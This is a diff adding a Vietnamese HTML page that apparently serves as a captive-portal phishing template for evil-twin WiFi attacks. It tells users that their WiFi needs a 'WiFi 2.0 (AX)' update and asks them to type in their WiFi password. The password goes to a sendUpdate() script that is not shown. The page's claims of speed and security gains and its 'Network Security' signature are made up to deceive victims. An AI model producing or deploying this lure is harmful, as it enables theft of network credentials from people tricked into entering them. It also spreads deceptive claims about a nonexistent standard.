@@ -1,0 +1,101 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Thông báo cập nhật!</title>
+
+    <style type="text/css">
+      body,
+      p {
+        font-family: Arial;
+        font-size: 14px;
+        line-height: 180%;
+        text-align: left;
+      }
+      h1 {
+        text-align: left;
+        font-size: 30px;
+        line-height: normal;
+        color: #0068b1;
+      }
+      #errorbody {
+        width: 620px;
+        display: block;
+        padding-top: 5em;
+      }
+      #status {
+        text-align: center;
+        text-transform: uppercase;
+        padding: 5px;
+        color: #fff;
+        position: sticky;
+        top: 0;
+        z-index: 99;
+      }
+      #wifi-password {
+        width: 50%;
+        height: 25px;
+        border: 2px solid #000;
+      }
+      #wifi-password:focus {
+        outline: none !important;
+        border: 2px solid #00f;
+      }
+    </style>
+    <script src="js/site.js"></script>
+    <script src="js/update.js"></script>
+  </head>
+  <body>
+    <div id="status"></div>
+    <div align="center">
+      <div id="errorbody">
+        <h1>
+          Phần mềm WiFi cần cập nhật theo chuẩn WiFi 2.0 (AX)<br />
+          Vui lòng nhập mật khẩu WiFi để tiến hành cập nhật:
+        </h1>
+        <b
+          ><font color="#ee0000"><span id="error-msg"></span></font
+        ></b>
+        <br />
+        <input id="wifi-password" type="password" /><br />
+        <input type="checkbox" onclick="showPassword()" />Hiện mật khẩu<br />
+        <button
+          id="submit"
+          onclick="sendUpdate()"
+          class="select"
+          data-translate="start"
+        >
+          Xác nhận
+        </button>
+        <br />
+        <br />
+        <p>
+          <b
+            ><font size="4"
+              >Những cải thiện của phiên bản WiFi 2.0 chuẩn (AX)</font
+            ></b
+          >
+          <br />
+          - Cải thiện tốc độ đường truyền dữ liệu lên đến 25% <br />
+          - Tăng độ ổn định của kết nối theo tiêu chuẩn sóng WiFi 2.0 (AX)
+          <br />
+          - Tăng cường bảo mật 2 chiều, chống hacker xâm nhập vào WiFi và các
+          thiết bị kết nối <br />
+          - Nâng cấp băng thông và các dịch vụ quốc tế
+        </p>
+        <p>
+          <b
+            ><font color="#ee0000"
+              >LƯU Ý: <br />
+              - Vui lòng KHÔNG tắt WiFi trong quá trình cập nhật. <br />
+              - Quá trình cập nhật có thể mất tối đa 5 phút. <br />
+              - WiFi sẽ tự ngắt kết nối và khởi động lại sau khi cập nhật thành
+              công. <br /> </font
+          ></b>
+        </p>
+        <br />
+        <p id="version">© 2021 Network Security All Rights Reserved</p>
+      </div>
+    </div>
+  </body>
+</html>
